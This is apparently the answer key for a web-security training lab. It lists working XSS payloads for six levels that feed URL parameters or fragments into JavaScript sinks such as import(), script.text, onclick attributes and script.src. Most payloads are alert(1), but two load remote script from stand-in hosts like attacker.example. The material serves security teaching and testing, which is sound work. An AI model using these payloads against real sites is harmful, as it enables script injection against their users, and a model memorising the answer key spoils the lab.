# codeexec — solutions

Dynamic code / module execution DOM sinks: `import()` module loaders, inline
`script.text` snippet runners, `setAttribute('onclick', ...)` config-driven
event binding, and dynamic external `script.src` tag loaders. Each level wires
a reflected param or a client-side source (`location.search`, `location.hash`)
straight into a JS-execution sink.

### codeexec-level1

`/codeexec/level1/?query=data:text/javascript,alert(1)`

- payload: `data:text/javascript,alert(1)`
- context: `location.search` value passed to `import(...)`; the data: module is
  loaded and its top-level code runs. (`https://attacker/x.js` also works.)

### codeexec-level2

`/codeexec/level2/?query=data:text/javascript,alert(1)`

- payload: `data:text/javascript,alert(1)`
- context: reflected into `import('...')`; the data: specifier runs directly.
  String breakout `'),import('data:text/javascript,alert(1)')//` also works.

### codeexec-level3

`/codeexec/level3/#alert(1)`

- payload: `alert(1)` (in the URL fragment)
- context: `location.hash` assigned to `script.text` of a freshly created
  `<script>` element; appending it executes the body. No HTML tags needed.

### codeexec-level4

`/codeexec/level4/?query=alert(1)`

- payload: `alert(1)`
- context: reflected into a JS string then set as `script.text` and appended;
  the snippet runs as an inline script body. (`'-alert(1)-'` breakout also fires.)

### codeexec-level5

`/codeexec/level5/?query=alert(1)`

- payload: `alert(1)`
- context: reflected into `setAttribute('onclick', '...')` on a button that is
  programmatically `.click()`ed, so the inline handler executes.

### codeexec-level6

`/codeexec/level6/?query=//attacker.example/x.js`

- payload: `//attacker.example/x.js` (or `data:text/javascript,alert(1)`)
- context: reflected value assigned to `script.src` of a dynamically created
  and appended `<script>`; the remote/data script loads and runs.
